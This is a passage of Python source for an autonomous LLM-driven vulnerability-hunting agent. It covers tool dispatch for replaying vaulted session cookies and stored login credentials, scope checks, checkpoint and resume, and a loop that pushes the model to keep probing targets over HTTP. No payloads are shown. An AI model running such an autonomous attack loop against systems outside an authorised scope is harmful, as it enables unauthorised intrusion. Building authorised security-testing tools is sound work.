                "cookies": len(res.cookies), "auth_headers": res.headers,
                "notes": res.notes,
            }, indent=1)

        if name == "vault_load":
            sess = self.vault.load(args["target"])
            if sess is None:
                return f"No vaulted session for {args['target']}"
            for c in sess.cookies:
                try:
                    self._client.cookies.set(c.get("name", ""), c.get("value", ""),
                                             domain=c.get("domain") or None)
                except Exception:  # noqa: BLE001
                    pass
            return json.dumps({
                "label": sess.label, "email": sess.email,
                "headers": sess.headers, "cookies_installed": len(sess.cookies),
                "notes": sess.notes,
            }, indent=1)

        # ---- auth profiles -------------------------------------------------
        if name == "auth_profile":
            from ..store.profiles import AuthProfile
            op = args.get("op")
            if op == "list":
                return json.dumps(self.profiles.list(), indent=1)
            if op == "save":
                if not (args.get("name") and args.get("login_url")):
                    return "ERROR: save needs name + login_url (+ username/password)"
                p = AuthProfile(
                    name=args["name"], target=args.get("target", ""),
                    kind=args.get("kind", "form"), login_url=args["login_url"],
                    username_field=args.get("username_field", "email"),
                    password_field=args.get("password_field", "password"),
                    username=args.get("username", ""),
                    password=args.get("password", ""),
                    success_marker=args.get("success_marker", ""),
                )
                return self.profiles.upsert(p)
            if op == "login":
                return await self.profiles.login(args.get("name", ""),
                                                 self._client, self.guard)
            return "ERROR: op ∈ {save, list, login}"

        # ---- scope ----------------------------------------------------------
        if name == "check_scope":
            try:
                self.guard.check_url(args["url"])
                return "IN SCOPE"
            except ScopeViolation as sv:
                return f"OUT OF SCOPE: {sv}"

        return f"ERROR: unknown tool {name}"

    # ==================================================================
    # checkpoint / resume
    # ==================================================================
    def _checkpoint(self, messages: list[dict]) -> None:
        try:
            from dataclasses import asdict
            payload = {
                "run_id": self.state.run_id,
                "saved_at": datetime.now(timezone.utc).isoformat(),
                "iterations": self.iterations,
                "messages": messages,
                "todos": {i: t.__dict__ for i, t in self.state.todos.items()},
                "threat_model": self.state.threat_model,
                "surface_path": str(self._surface_path) if self._surface_path else None,
                # full durable state — a resumed run must not lose findings
                "findings": [asdict(f) for f in self.state.findings],
                "coverage": [asdict(c) for c in self.state.coverage],
                "notes": self.state.notes,
            }
            (self.state.dir / "checkpoint.json").write_text(
                json.dumps(payload, default=str), encoding="utf-8")
        except Exception as exc:  # noqa: BLE001
            log.debug("checkpoint failed: %s", exc)

    @staticmethod
    def load_checkpoint(run_dir: Path) -> dict | None:
        cp = run_dir / "checkpoint.json"
        if not cp.exists():
            return None
        try:
            return json.loads(cp.read_text(encoding="utf-8"))
        except Exception:  # noqa: BLE001
            return None

    # ==================================================================
    # main loop
    # ==================================================================
    async def run(self, target: str) -> dict:
        tools = self._tool_schemas()
        tools += await self.mcp.tool_schemas()

        mcp_tools = self.mcp.tool_names()
        messages: list[dict]

        if self.resume_state and self.resume_state.get("messages"):
            messages = self.resume_state["messages"]
            self.iterations = int(self.resume_state.get("iterations", 0))
            self._reqs_at_iter = len(self.state.request_log)
            self.state.threat_model = self.resume_state.get("threat_model", "")
            sp = self.resume_state.get("surface_path")
            if sp and Path(sp).exists():
                self._surface_path = Path(sp)
            for i, td in (self.resume_state.get("todos") or {}).items():
                self.state.todos[int(i)] = TodoItem(
                    id=int(i), content=td.get("content", ""),
                    status=td.get("status", "pending"))
            # restore durable hunt state so reports keep everything
            from ..store.state import CoverageEntry, Finding
            for fd in self.resume_state.get("findings") or []:
                try:
                    self.state.findings.append(Finding(**{
                        k: v for k, v in fd.items()
                        if k in Finding.__dataclass_fields__}))
                except Exception:  # noqa: BLE001
                    pass
            for cd in self.resume_state.get("coverage") or []:
                try:
                    self.state.coverage.append(CoverageEntry(
                        cd.get("target", ""), cd.get("check", ""),
                        cd.get("outcome", ""), cd.get("evidence", ""),
                        cd.get("ts", 0.0)))
                except Exception:  # noqa: BLE001
                    pass
            self.state.notes = self.resume_state.get("notes") or []
            messages.append({"role": "user", "content":
                             "[RESUMED after interruption — continue the hunt "
                             "from where you left off. Re-check todos.]"})
            self._hook("iter", f"resumed at iter {self.iterations}")
        else:
            messages = [
                {"role": "system", "content": strip_invisibles(SYSTEM_PROMPT)},
                {"role": "user", "content": strip_invisibles(
                    build_user_kickoff(target, None, mcp_tools,
                                       getattr(self, "goal", "")))},
            ]

        st = self.state
        st.log_event("run_start", target=target, model=self.s.llm.model,
                     scope=self.guard.rules,
                     resumed=bool(self.resume_state))
        self.phase_label = "hunt"

        idle_nudges = 0
        llm_lost = False
        while (self.iterations < self.s.agent.max_iterations
               and not self.finish_flag["done"] and not self.stop_requested):
            self.iterations += 1
            try:
                resp = await asyncio.to_thread(self.llm.chat, messages, tools)
            except Exception as exc:  # noqa: BLE001 — brain died mid-hunt
                llm_lost = True
                st.log_event("llm_lost", error=str(exc),
                             iteration=self.iterations)
                self._hook("error", f"LLM unreachable: {exc}")
                self.phase_label = "llm-lost (resumable)"
                break
            self.cost.record(resp.usage.get("prompt_tokens", 0),
                             resp.usage.get("completion_tokens", 0))

            if resp.text.strip():
                messages.append({"role": "assistant", "content": resp.text})
                self._hook("iter", resp.text.strip().splitlines()[0][:140])
                log.info("[iter %d] %s", self.iterations,
                         resp.text.strip().splitlines()[0][:160])

            if not resp.tool_calls:
                idle_nudges += 1
                if idle_nudges >= 4:
                    break
                messages.append({"role": "user", "content":
                                 "You produced no tool calls. Use tools or call "
                                 "finish. Do not answer in prose."})
                continue

            idle_nudges = 0
            messages.append({
                "role": "assistant",
                "content": resp.text or None,
                "tool_calls": [
                    {"id": tc.id, "type": "function",
                     "function": {"name": tc.name,
                                  "arguments": json.dumps(tc.arguments)}}
                    for tc in resp.tool_calls
                ],
            })

            did_work = False
            for tc in resp.tool_calls:
                log.info("[iter %d] tool %s %s", self.iterations, tc.name,
                         _short(json.dumps(tc.arguments), 200))
                if tc.name not in ("todo", "finish", "notes"):
                    did_work = True
                result = await self._dispatch(tc.name, tc.arguments)
                st.observe(result)
                content, inj = guard_output(
                    strip_invisibles(result),
                    enabled=self.s.agent.injection_guard)
                if inj.triggered:
                    st.log_event("injection_guard", tool=tc.name,
                                 patterns=inj.names)
                messages.append({"role": "tool", "tool_call_id": tc.id,
                                 "content": content})

            # net-stall watchdog: tool calls are flowing but NO request has
            # hit the wire and only meta tools ran (planning/todo loops that
            # burn the whole budget). Nudge hard, then stop — a resume/
            # retry beats 40 dead iterations. Offline analysis tools
            # (file_inspect, read_file, …) count as work, not idling.
            with st._lock:
                reqs_now = len(st.request_log)
            if reqs_now > self._reqs_at_iter or did_work:
                self._reqs_at_iter = reqs_now
                self._net_idle = 0
            else:
                self._net_idle += 1
                if self._net_idle == 8:
                    messages.append({"role": "user", "content":
                                     "You have made NO HTTP requests for 8 "
                                     "turns — you are looping in planning. "
                                     "Pick the highest-value untested surface "
                                     "and call http/probe on it NOW."})
                elif self._net_idle >= 18:
                    st.log_event("net_stall", iterations=self.iterations,
                                 requests=reqs_now)
                    break

            # endurance: compact old context, checkpoint every 5 iters
            messages, _ = compact_messages(messages)
            if self.iterations % 5 == 0:
                self._checkpoint(messages)

        if self.stop_requested:
            self.phase_label = "stopped"
            self._checkpoint(messages)
            st.log_event("stopped_by_user", iterations=self.iterations)
        elif llm_lost:
            # endurance: never lose the hunt — checkpoint for --resume
            self._checkpoint(messages)
        elif not self.finish_flag["done"]:
            st.log_event("budget_exhausted", iterations=self.iterations)

        # ---- AI Gauntlet: adversarial second pass over every finding ------
        gauntlet_summary = None
        if st.findings and not llm_lost:
            try:
                from ..vulns.gauntlet import run_gauntlet
                self.phase_label = "gauntlet"
                gauntlet_summary = await run_gauntlet(self)
                self._hook("gauntlet", json.dumps(gauntlet_summary))
            except Exception as exc:  # noqa: BLE001 — never block the report
                log.warning("gauntlet skipped: %s", exc)

        # ---- wrap up ------------------------------------------------------
        state_path = st.snapshot()
        if self.browser is not None:
            await self.browser.close()
        await self.probes.aclose()
        await self._client.aclose()
        if self._own_mcp:
            await self.mcp.close()
        await self.oob.close()

        tamper = self.evidence.verify()
        st.log_event("run_end", iterations=self.iterations,
                     finished=self.finish_flag["done"], stopped=self.stop_requested,
                     llm_lost=llm_lost, findings=len(st.findings),
                     coverage=st.coverage_summary(),
                     evidence_integrity="OK" if not tamper else "TAMPERED")
        result = {
            "iterations": self.iterations,
            "finished": self.finish_flag["done"],
            "stopped": self.stop_requested,
            "llm_lost": llm_lost,
            "resumable": llm_lost or self.stop_requested,
            "summary": self.finish_flag.get("summary", (
                "run interrupted (LLM unreachable) — checkpoint saved, "
                "resume with: avci hunt --resume <run_dir>" if llm_lost else "")),
            "findings": len(st.findings),
            "coverage": st.coverage_summary(),
            "tokens": {
                "prompt": self.llm.total_prompt_tokens,
                "completion": self.llm.total_completion_tokens,
            },
            "cost": self.cost.summary(),
            "requests": len(st.request_log),
            "evidence_integrity": "OK" if not tamper else f"TAMPERED: {tamper}",
            "state_file": str(state_path),
        }
        if gauntlet_summary is not None:
            result["gauntlet"] = gauntlet_summary
        if self.notifier.armed:
            try:
                self.notifier.run_end(result)
            except Exception:  # noqa: BLE001
                pass
        return result
